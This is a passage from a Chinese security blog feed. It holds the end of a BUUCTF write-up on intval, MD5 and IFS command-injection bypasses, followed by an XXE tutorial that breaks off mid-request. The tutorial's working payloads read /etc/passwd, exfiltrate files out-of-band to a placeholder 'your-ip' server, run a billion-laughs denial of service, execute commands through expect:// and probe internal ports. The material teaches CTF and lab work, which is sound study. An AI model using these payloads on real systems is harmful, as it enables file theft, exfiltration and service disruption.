        <content type="html"><![CDATA[<p>看到title里面有bot，查看robots.txt文件，发现假的flag文件，观察到返回报文header头，里面的fl4g.php，访问得到闯关函数</p><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><h3 id="intval-漏洞"><a href="#intval-漏洞" class="headerlink" title="intval 漏洞"></a>intval 漏洞</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;2e3&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$a</span>);<span class="comment">//2</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$a</span>+<span class="number">1</span>);<span class="comment">//20001</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="md5弱比较"><a href="#md5弱比较" class="headerlink" title="md5弱比较"></a>md5弱比较</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0e215962017</span><br><span class="line">md5值：0e291242476940776845150308577824</span><br><span class="line">0e2159620</span><br><span class="line">md5值：0e2159620</span><br></pre></td></tr></table></figure><h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> flag.txt</span><br><span class="line"><span class="built_in">cat</span><span class="variable">$&#123;IFS&#125;</span>flag.txt</span><br><span class="line"><span class="built_in">cat</span>$IFS<span class="variable">$9flag</span>.txt //后面的9可以是别的整数</span><br><span class="line"><span class="built_in">cat</span>&lt;flag.txt</span><br><span class="line"><span class="built_in">cat</span>&lt;&gt;flag.txt</span><br></pre></td></tr></table></figure><p>最终payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://a0f041d2-afdc-478d-aebe-7044e7c617ba.node4.buuoj.cn:81/fl4g.php?num=2e4&amp;&amp;md5=0e215962017&amp;&amp;get_flag=more$&#123;IFS&#125;fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> WEB 绕过 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XXE漏洞初探及简单实战</title>
      <link href="/2022/04/15/XXE%E6%BC%8F%E6%B4%9E%E5%88%9D%E6%8E%A2%E5%8F%8A%E7%AE%80%E5%8D%95%E5%AE%9E%E6%88%98/"/>
      <url>/2022/04/15/XXE%E6%BC%8F%E6%B4%9E%E5%88%9D%E6%8E%A2%E5%8F%8A%E7%AE%80%E5%8D%95%E5%AE%9E%E6%88%98/</url>
      
        <content type="html"><![CDATA[<h1 id="什么是XXE漏洞？"><a href="#什么是XXE漏洞？" class="headerlink" title="什么是XXE漏洞？"></a>什么是XXE漏洞？</h1><p>XML External Entity 即外部实体，从安全角度理解成XML External Entity attack 外部实体注入攻击。由于程序在解析输入的XML数据时，解析了攻击者伪造的外部实体而产生的。　libxml2.9.1及以后，默认不解析外部实体。该漏洞也就逐渐衰落。</p><h1 id="原理是什么？"><a href="#原理是什么？" class="headerlink" title="原理是什么？"></a>原理是什么？</h1><p>个人理解，XML可以引用外部实体，也就是类似于文件包含，造成漏洞。</p><h1 id="XML-简单了解"><a href="#XML-简单了解" class="headerlink" title="XML 简单了解"></a>XML 简单了解</h1><ul><li>XML被设计为传输和存储数据，其焦点是数据的内容。</li><li>HTML被设计用来显示数据，其焦点是数据的外观。</li></ul><h1 id="DTD简单了解"><a href="#DTD简单了解" class="headerlink" title="DTD简单了解"></a>DTD简单了解</h1><p>Document Type Definition 即文档类型定义，用来为XML文档定义语义约束。可以嵌入在XML文档中(内部声明)，也可以独立的放在另外一个单独的文件中(外部引用)。<br>可以理解成个性化的XML格式 <a href="https://www.w3school.com.cn/dtd/dtd_entities.asp">DTD实体传送</a><br>一般的payload结构</p><p><img src="/2022/04/15/XXE%E6%BC%8F%E6%B4%9E%E5%88%9D%E6%8E%A2%E5%8F%8A%E7%AE%80%E5%8D%95%E5%AE%9E%E6%88%98/2022-04-15-23-26-52.png"></p><h2 id="实体分为一般实体和参数实体"><a href="#实体分为一般实体和参数实体" class="headerlink" title="实体分为一般实体和参数实体"></a>实体分为一般实体和参数实体</h2><ol><li>一般实体的声明：<!ENTITY 实体名称 "实体内容"></li></ol><p>　　　引用一般实体的方法：&amp;实体名称;</p><p>　　p.s.经实验，普通实体可以在DTD中引用，可以在XML中引用，可以在声明前引用，还可以在实体声明内部引用。</p><ol start="2"><li>参数实体的声明：<!ENTITY % 实体名称 "实体内容"></li></ol><p>　　　引用参数实体的方法：%实体名称;</p><p>　　p.s.经实验，参数实体只能在DTD中引用，不能在声明前引用，也不能在实体声明内部引用。</p><p>　　如果实体名称中出现如&lt;的特殊字符，解析就会失败。为了避免这种情况，XML用实体引用替换特殊字符。XML预定义了五个实体引用，即用&lt;、 &gt;、 &amp;、 &amp;apos、 “替换&lt;、&gt;、&amp;、’、”。</p><h2 id="DTD实体声明（重点）"><a href="#DTD实体声明（重点）" class="headerlink" title="DTD实体声明（重点）"></a>DTD实体声明（重点）</h2><ol><li>内部实体声明</li></ol><p>　　<!ENTITY 实体名称 "实体的值"></p><p>　　当引用一般实体时，由三部分构成：&amp;、实体名、；，当是用参数传入xml的时候，&amp;需URL编码，不然&amp;会被认为是参数间的连接符号。</p><p>　　示例：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = &quot;1.0&quot; encoding = &quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">writer</span> <span class="string">&quot;Dawn&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">copyright</span> <span class="string">&quot;Copyright W3School.com.cn&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span><span class="symbol">&amp;writer;</span>©right;<span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br></pre></td></tr></table></figure><ol start="2"><li><p>外部实体声明</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">　　<span class="meta">&lt;!ENTITY 实体名称 <span class="keyword">SYSTEM</span> <span class="string">&quot;URI/URL&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p><a href="https://www.freebuf.com/articles/network/181064.html">不同语言框架支持的协议传送门</a><br>简单的例子</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = &quot;1.0&quot; encoding = &quot;utf-8&quot;?&gt;</span></span><br><span class="line">  <span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">copyright</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  ]&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">author</span>&gt;</span><span class="symbol">&amp;file;</span>©right;<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="如何构造外部实体注入攻击"><a href="#如何构造外部实体注入攻击" class="headerlink" title="如何构造外部实体注入攻击"></a>如何构造外部实体注入攻击</h1><p>分有无回显</p><h2 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h2><h3 id="不引用外部DTD文档"><a href="#不引用外部DTD文档" class="headerlink" title="不引用外部DTD文档"></a>不引用外部DTD文档</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line">      <span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [</span></span><br><span class="line"><span class="meta">              <span class="meta">&lt;!ENTITY <span class="keyword">test</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">      ]&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">abc</span>&gt;</span><span class="symbol">&amp;test;</span><span class="tag">&lt;/<span class="name">abc</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="引用外部DTD文档"><a href="#引用外部DTD文档" class="headerlink" title="引用外部DTD文档"></a>引用外部DTD文档</h3></li><li><p>引用外部文档，再引用外部实体</p><p>evil.dtd</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY b <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>引用，这里理解为实体文件已经被包含</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line">    <span class="meta">&lt;!DOCTYPE a <span class="keyword">SYSTEM</span> <span class="string">&quot;http://localhost/evil.dtd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">abc</span>&gt;</span><span class="symbol">&amp;b;</span><span class="tag">&lt;/<span class="name">abc</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>通过DTD外部实体声明引入外部实体声明<br>evil.dtd</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY b <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>引用，个人理解为外部实体文档被声明为实体参数，还需要引用才生效</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line">  <span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta">          <span class="meta">&lt;!ENTITY % d <span class="keyword">SYSTEM</span> <span class="string">&quot;http://localhost/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  %d;</span></span><br><span class="line"><span class="meta">  ]&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">abc</span>&gt;</span><span class="symbol">&amp;b;</span><span class="tag">&lt;/<span class="name">abc</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h2></li><li><p>第一种写法</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span> </span><br><span class="line"> <span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///c://test/1.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ENTITY % <span class="keyword">dtd</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://localhost/evil.xml&quot;</span>&gt;</span> </span></span><br><span class="line"><span class="meta"> %dtd; %all; </span></span><br><span class="line"><span class="meta"> ]&gt;</span> </span><br><span class="line"> <span class="tag">&lt;<span class="name">abc</span>&gt;</span><span class="symbol">&amp;send;</span><span class="tag">&lt;/<span class="name">abc</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其中evil.xml文件内容为</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">all</span> <span class="string">&quot;&lt;!ENTITY send SYSTEM &#x27;http://localhost%file;&#x27;&gt;&quot;</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><p>调用过程为：参数实体dtd调用外部实体evil.xml，然后又调用参数实体all，接着调用实体send。<br>2. 第二种写法<br>   <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/convert.base64-encode/resource=c:/test/1.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">dtd</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://localhost/evil.xml&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%dtd;</span></span><br><span class="line"><span class="meta">%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">abc</span>&gt;</span><span class="tag">&lt;/<span class="name">abc</span>&gt;</span></span><br></pre></td></tr></table></figure><br>   其中evil.xml文件内容为：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">payload</span> <span class="string">&quot;&lt;!ENTITY % send SYSTEM &#x27;http://localhost/?content=%file;&#x27;&gt;&quot;</span>&gt;</span> %payload;</span><br></pre></td></tr></table></figure><h1 id="XXE带来的危害"><a href="#XXE带来的危害" class="headerlink" title="XXE带来的危害"></a>XXE带来的危害</h1><p>利用xxe漏洞可以进行文件读取，拒绝服务攻击，命令(代码)执行，SQL(XSS)注入，内外扫描端口，入侵内网站点等。内网探测和入侵是利用xxe中支持的协议进行内网主机和端口发现，可以理解是使用xxe进行SSRF的利用，基本上啥都能做。</p><h2 id="危害1-读取任意文件"><a href="#危害1-读取任意文件" class="headerlink" title="危害1.读取任意文件"></a>危害1.读取任意文件</h2><h3 id="有回显-1"><a href="#有回显-1" class="headerlink" title="有回显"></a>有回显</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line">    <span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">test</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///E://phpStudy/PHPTutorial/WWW/etc/passwd.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    ]&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">abc</span>&gt;</span><span class="symbol">&amp;test;</span><span class="tag">&lt;/<span class="name">abc</span>&gt;</span></span><br></pre></td></tr></table></figure><p>例：<br>buuctf 题目BUU XXE COURSE 1，登陆抓包，发现</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /login.php HTTP/1.1</span><br><span class="line">Host: 3096e446-29bb-4deb-9712-c35861a41947.node4.buuoj.cn:81</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: text/plain;charset=UTF-8</span><br><span class="line">Content-Length: 104</span><br><span class="line">Origin: http://3096e446-29bb-4deb-9712-c35861a41947.node4.buuoj.cn:81</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Referer: http://3096e446-29bb-4deb-9712-c35861a41947.node4.buuoj.cn:81/</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><span class="tag">&lt;<span class="name">root</span>&gt;</span> <span class="tag">&lt;<span class="name">username</span>&gt;</span>aaaa<span class="tag">&lt;/<span class="name">username</span>&gt;</span> <span class="tag">&lt;<span class="name">password</span>&gt;</span>bbbb<span class="tag">&lt;/<span class="name">password</span>&gt;</span> <span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>更改数据包，拿到flag</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">POST /login.php HTTP/1.1</span><br><span class="line">Host: 3096e446-29bb-4deb-9712-c35861a41947.node4.buuoj.cn:81</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: text/plain;charset=UTF-8</span><br><span class="line">Content-Length: 169</span><br><span class="line">Origin: http://3096e446-29bb-4deb-9712-c35861a41947.node4.buuoj.cn:81</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Referer: http://3096e446-29bb-4deb-9712-c35861a41947.node4.buuoj.cn:81/</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line">    <span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">test</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    ]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;test;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">password</span>&gt;</span>bbbb<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="无回显，暂未实测"><a href="#无回显，暂未实测" class="headerlink" title="无回显，暂未实测"></a>无回显，暂未实测</h3><p>本次测试用的phpStudy，需开启apache日志记录并重启服务。当无回显情况时，可以讲数据发送到远程服务器。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/convert.base64-encode/resource=目标文件路径&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">dtd</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://your-ip/evil.xml&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%dtd;</span></span><br><span class="line"><span class="meta">%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">abc</span>&gt;</span><span class="tag">&lt;/<span class="name">abc</span>&gt;</span></span><br></pre></td></tr></table></figure><p>远程服务器部署evil.xml内容为:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">payload</span> <span class="string">&quot;&lt;!ENTITY % send SYSTEM &#x27;http://your-ip/?content=%file;&#x27;&gt;&quot;</span>&gt;</span> %payload;</span><br></pre></td></tr></table></figure><h2 id="危害2-拒绝服务攻击"><a href="#危害2-拒绝服务攻击" class="headerlink" title="危害2.拒绝服务攻击"></a>危害2.拒绝服务攻击</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line">   <span class="meta">&lt;!DOCTYPE <span class="keyword">lolz</span> [</span></span><br><span class="line"><span class="meta">   <span class="meta">&lt;!ENTITY <span class="keyword">lol</span> <span class="string">&quot;lol&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">   <span class="meta">&lt;!ENTITY <span class="keyword">lol2</span> <span class="string">&quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">   <span class="meta">&lt;!ENTITY <span class="keyword">lol3</span> <span class="string">&quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">   <span class="meta">&lt;!ENTITY <span class="keyword">lol4</span> <span class="string">&quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">   <span class="meta">&lt;!ENTITY <span class="keyword">lol5</span> <span class="string">&quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">   <span class="meta">&lt;!ENTITY <span class="keyword">lol6</span> <span class="string">&quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">   <span class="meta">&lt;!ENTITY <span class="keyword">lol7</span> <span class="string">&quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">   <span class="meta">&lt;!ENTITY <span class="keyword">lol8</span> <span class="string">&quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">   <span class="meta">&lt;!ENTITY <span class="keyword">lol9</span> <span class="string">&quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">   ]&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">lolz</span>&gt;</span>&amp;lol9;<span class="tag">&lt;/<span class="name">lolz</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="危害3-远程命令-代码-执行"><a href="#危害3-远程命令-代码-执行" class="headerlink" title="危害3.远程命令(代码)执行"></a>危害3.远程命令(代码)执行</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">test</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;expect://id&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">abc</span>&gt;</span><span class="symbol">&amp;test;</span><span class="tag">&lt;/<span class="name">abc</span>&gt;</span></span><br></pre></td></tr></table></figure><p>此示例是在安装expect扩展的PHP环境里执行系统命令，其他协议也有可能有此漏洞。</p><h2 id="危害4-内网信息探测"><a href="#危害4-内网信息探测" class="headerlink" title="危害4.内网信息探测"></a>危害4.内网信息探测</h2><p>　　利用http协议<a href="http://url/file.ext%EF%BC%8C%E6%9B%BF%E6%8D%A2%E6%A0%87%E5%87%86poc%E4%B8%AD%E7%9B%B8%E5%BA%94%E9%83%A8%E5%88%86%E5%8D%B3%E5%8F%AF,%E8%BF%99%E7%A7%8D%E6%83%85%E5%86%B5%E6%AF%94%E8%BE%83%E4%B8%8D%E7%A8%B3%E5%AE%9A%EF%BC%8C%E6%A0%B9%E6%8D%AE%E4%B8%8D%E5%90%8Cxml%E8%A7%A3%E6%9E%90%E5%99%A8%E4%BC%9A%E5%BE%97%E5%88%B0%E4%B8%8D%E5%90%8C%E7%9A%84%E5%9B%9E%E6%98%BE%E6%8A%A5%E9%94%99%E7%BB%93%E6%9E%9C%E3%80%82">http://url/file.ext，替换标准poc中相应部分即可,这种情况比较不稳定，根据不同xml解析器会得到不同的回显报错结果。</a></p><p>payload：</p><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY test SYSTEM &quot;http://127.0.0.1:87/tets.txt&quot;&gt;]&gt;&lt;abc&gt;&amp;test;&lt;/abc&gt;</code></pre><h2 id="危害5-攻击内网网站"><a href="#危害5-攻击内网网站" class="headerlink" title="危害5.攻击内网网站"></a>危害5.攻击内网网站</h2><p>待补</p><h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><h2 id="buuctf-PHP-XXE"><a href="#buuctf-PHP-XXE" class="headerlink" title="buuctf [PHP]XXE"></a>buuctf [PHP]XXE</h2><p>看到Libxml版本低于2.9，可能存在XXE漏洞<br>dom.php、SimpleXMLElement.php、simplexml_load_string.php均可触发XXE漏洞</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST /simplexml_load_string.php 